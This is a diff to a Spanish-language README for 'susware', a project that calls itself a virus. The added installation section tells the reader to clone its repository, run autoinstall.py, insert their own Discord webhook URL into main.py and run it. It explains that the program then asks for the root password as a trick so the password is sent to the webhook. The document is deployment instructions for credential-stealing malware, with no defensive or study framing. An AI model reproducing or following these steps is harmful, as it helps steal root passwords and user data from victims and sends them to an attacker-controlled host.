@@ -11,7 +11,7 @@
           Referencias
      </h2>
      <b><a href="#susware">¿Qué es susware?</a></b><br>
-     <b><a href="">Instalación</a></b><br>
+     <b><a href="#install">Instalación</a></b><br>
      
      
 </div>
@@ -40,4 +40,32 @@
 
 -----
 
+<div align="center" id="install">
+     <h3>Instalación del software</h3>
+     <p align="justify">
+Para instalar el susware, es muy sencillo. <br>
+<br>
+En el caso <b>de linux</b>, tendrás que poner los siguientes comandos
 
+```bash
+# Primero copiamos el git y entramos a la carpeta de linux dentro del git copiado
+# Segundo, ejecutamos autoinstall.py
+git clone https://github.com/lVoidi/susware-source sus && cd sus/linux && python3 autoinstall.py
+
+# Ahora, tenemos que asociar un webhook con el virus
+# Para esto, tenemos que crear un webhook de discord y copiar su url
+# Una vez tenemos la URL del webhook, hacemos vim a main.py y buscamos
+# la línea número 64, en la funcion user_info
+# buscas el apartado de webhook y donde dice "link del webhook", lo quitas
+# y pones el link del webhook tuyo DENTRO de las comillas
+# Una vez hecho todo esto, simplemente ejecutamos
+
+python3 main.py
+
+# Y empezará a correr el virus
+```
+
+Una vez <b>hecho esto</b>, el virus te va a pedir tu contraseña root, este es una especie de "engaño" <br>
+para poder mandar tu contraseña por medio del webhook
+     </p>
+</div>
